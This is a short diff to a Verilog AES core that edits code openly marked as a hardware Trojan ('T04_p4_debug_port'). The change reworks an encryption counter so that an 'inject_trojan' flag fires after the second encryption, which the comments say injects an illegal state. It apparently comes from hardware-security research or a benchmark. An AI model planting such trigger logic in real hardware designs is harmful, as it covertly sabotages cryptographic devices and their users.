@@ -61,7 +61,6 @@ module aes_core(
   // Encryption counter for sequential trigger
   reg [7:0]   encrypt_count;
   reg         inject_trojan;      // Flag to inject illegal state next cycle
-  reg         trojan_triggered;   // Flag that Trojan has been triggered
   // TROJAN END: T04_p4_debug_port
 
 
@@ -181,7 +180,6 @@ module aes_core(
           // TROJAN BEGIN: T04_p4_debug_port
           encrypt_count      <= 8'd0;
           inject_trojan     <= 1'b0;
-          trojan_triggered   <= 1'b0;
           // TROJAN END: T04_p4_debug_port
         end
       else
@@ -203,13 +201,13 @@ module aes_core(
           end
 
           // TROJAN: T04 - Count encryptions and set trigger flag
+          // Inject illegal state after 2nd encryption completes
           if (aes_core_ctrl_reg == CTRL_IDLE && next && encdec) begin
             encrypt_count <= encrypt_count + 8'd1;
-            // Trigger on 2nd+ encryption (only once per key load)
-            if (encrypt_count >= 8'd1 && !inject_trojan && !trojan_triggered) begin
-              inject_trojan <= 1'b1;
-              trojan_triggered <= 1'b1;
-            end
+          end
+          // Inject illegal state after 2nd encryption completes
+          if (aes_core_ctrl_reg == CTRL_NEXT && muxed_ready && encrypt_count >= 8'd1 && !inject_trojan) begin
+            inject_trojan <= 1'b1;
           end
         end
     end // reg_update
